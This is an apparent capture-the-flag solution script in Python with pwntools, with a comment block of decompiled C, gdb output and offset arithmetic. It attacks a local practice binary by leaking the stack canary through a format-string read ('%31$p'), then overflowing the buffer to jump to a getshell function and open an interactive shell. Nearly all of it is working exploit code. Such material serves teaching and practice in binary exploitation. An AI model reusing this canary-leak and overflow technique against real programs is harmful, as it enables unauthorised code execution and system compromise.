'''
file: a01_stack_08_canary_01_by_read_printf_2times.c

v3 = __readgsdword(0x14u);
for ( i = 0; i <= 1; ++i )
{
  read(0, buf, 0x200u);
  printf(buf);
}
return __readgsdword(0x14u) ^ v3;

offset
0x8048643 <vuln+24>        mov    DWORD PTR [ebp-0xc], eax
> print $ebp-0xc
$1 = (void *) 0xffffd10c

0x804866e <vuln+67>        call   0x8048430 <printf@plt>
0xffffd090│+0x0000: 0xffffd0a8  →  "AAAA"    ← $esp

offset_fms
=(addr_of_canary-$esp)/word_len
=(0xffffd10c-0xffffd090)/4
=31
'''
from pwn import *

context(os='linux', arch='i386', log_level='debug')
sh = process('a')
offset_fms = 31  # 格式化字符串的偏移量
offset_sta = 100  # 栈溢出覆盖返回地址的偏移量，计算方法和上面一个相同
# get canary
sh.sendlineafter('Hello Hacker!\n', '%' + str(offset_fms) + '$' + 'p')
sh.recvuntil('0x')
canary = int(sh.recv(8), 16)
print('canary = ' + hex(canary))
# getshell
getshell = ELF('a').sym['getshell']

exp = flat(
    'A' * offset_sta,  # padding
    canary, 'A' * 8,  # canary , 填充数可以ida看栈，也可以gdb断下这里看 esp 位置,需要填充多少
    'A' * 4,  # caller's $ebp
    getshell)  # ret addr

sh.send(exp)
sh.recv()
sh.interactive()
